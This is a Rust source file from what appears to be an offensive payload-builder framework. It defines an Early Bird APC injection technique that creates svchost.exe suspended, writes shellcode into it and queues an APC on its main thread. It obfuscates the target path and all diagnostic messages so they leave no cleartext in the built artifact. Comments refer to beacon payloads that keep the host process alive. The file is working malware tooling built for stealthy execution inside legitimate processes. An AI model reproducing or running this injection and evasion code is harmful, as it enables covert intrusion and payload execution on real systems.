//! Early Bird APC injection.
//!
//! Spawns a legitimate process suspended, writes the payload into it and queues
//! an APC to the main thread before it ever runs, so the payload executes during
//! the target's own initialization. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::PayloadFormat;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for Early Bird injection: which payload to run (the payload
/// format and export live in the payload's `build.payloads` entry).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Name of the payload in `build.payloads` to run. Optional when the plan
    /// declares exactly one payload.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,
    /// Process to create, suspend and inject into.
    #[serde(default = "default_target")]
    pub target: String,
    /// How long the loader waits for the target process to exit, in
    /// milliseconds.
    ///
    /// `0` (the default) does not wait at all: the APC is queued, the target is
    /// resumed and the loader walks on. A waiting loader is only useful to read
    /// the target's exit code back; a real payload (a beacon) keeps its target
    /// alive forever, so a chain must never block on the target unconditionally
    /// (see the README for the returned code in each case).
    #[serde(default)]
    pub wait_ms: u64,
}

impl Default for Params {
    /// Defaults to injecting into `svchost.exe` (see [`default_target`]) without
    /// waiting for the target.
    ///
    /// The manual impl keeps `Params::default()` and the `serde` field default
    /// in step: a runtime step with no `params:` mapping gets the default
    /// struct, not the field-level defaults.
    fn default() -> Self {
        Self {
            payload: None,
            target: default_target(),
            wait_ms: 0,
        }
    }
}

/// The default injection target: a process every Windows install has.
pub fn default_target() -> String {
    "C:\\Windows\\System32\\svchost.exe".to_string()
}

/// Static metadata for Early Bird injection.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "early_bird",
    attck: &["T1055.004"],
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/early_bird/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[super::PayloadFormat::Shellcode],
    requires_indirect_syscalls: false,
    params_example: r#"technique: early_bird
params:
  target: "C:\\Windows\\System32\\svchost.exe"
  wait_ms: 0
"#,
    readme: include_str!("README.md"),
    syscalls: &[
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtQueueApcThread",
        "NtResumeThread",
        "NtWaitForSingleObject",
        "NtClose",
    ],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment_for` replaces each placeholder with code that rebuilds the
/// text at run time (using `strings`'s active strategy), so no diagnostic — and
/// in particular no target path — lands in the artifact's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_EMPTY$", "the payload is empty"),
    (
        "$MSG_CREATE_FAILED$",
        "could not create the injection target suspended",
    ),
    (
        "$MSG_ALLOC_FAILED$",
        "could not allocate memory in the target process",
    ),
    (
        "$MSG_WRITE_FAILED$",
        "could not write the payload into the target process",
    ),
    (
        "$MSG_WRITE_SHORT$",
        "the target process accepted only part of the payload",
    ),
    (
        "$MSG_PROTECT_FAILED$",
        "could not make the payload executable in the target process",
    ),
    (
        "$MSG_APC_FAILED$",
        "could not queue the payload as an APC on the target's main thread",
    ),
    (
        "$MSG_RESUME_FAILED$",
        "could not resume the target's main thread",
    ),
    ("$MSG_WAIT_FAILED$", "could not wait for the target process"),
    (
        "$MSG_EXIT_CODE_FAILED$",
        "could not read the target's exit code",
    ),
];

impl Params {
    /// Renders the Early Bird stub fragment for these parameters.
    ///
    /// The target path and every runtime message are rebuilt from `strings`'s
    /// obfuscated bytes, so none of them appears in the artifact in cleartext.
    /// The payload-format guard is resolved here too: the technique runs raw
    /// shellcode, so a `pe`/`dll`/`dotnet` payload gets a fragment that fails
    /// with a clear message instead of executing a file header. (A build-time
    /// rule for that combination lives in `plan::validate`; the guard covers a
    /// plan that slips through.)
    pub fn render_fragment_for(
        &self,
        strings: &StringsConfig,
        format: PayloadFormat,
        _export: Option<&str>,
    ) -> String {
        let target_def = strings
            .obfuscate(&self.target)
            .render_stub_expr("early_bird_target");
        let unsupported_format = format!(
            "the early_bird technique runs raw shellcode payloads only (this payload's format is '{}')",
            format.label()
        );
        // `WaitForSingleObject`/`NtWaitForSingleObject` take a `u32` timeout;
        // `u32::MAX` is an infinite wait in both modes of the syscall layer.
        let wait_ms = self.wait_ms.min(u64::from(u32::MAX)) as u32;

        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("early_bird_msg_{index}")),
            );
        }
        rendered
            .replace("$TARGET_DEF$", &target_def)
            .replace("$WAIT_MS$", &format!("{wait_ms}u32"))
            .replace(
                "$SUPPORTED_FORMAT$",
                if format == PayloadFormat::Shellcode {
                    "true"
                } else {
                    "false"
                },
            )
            .replace(
                "$MSG_UNSUPPORTED_FORMAT$",
                &strings
                    .obfuscate(&unsupported_format)
                    .render_stub_expr("early_bird_unsupported"),
            )
    }
}

#[cfg(test)]
mod tests;
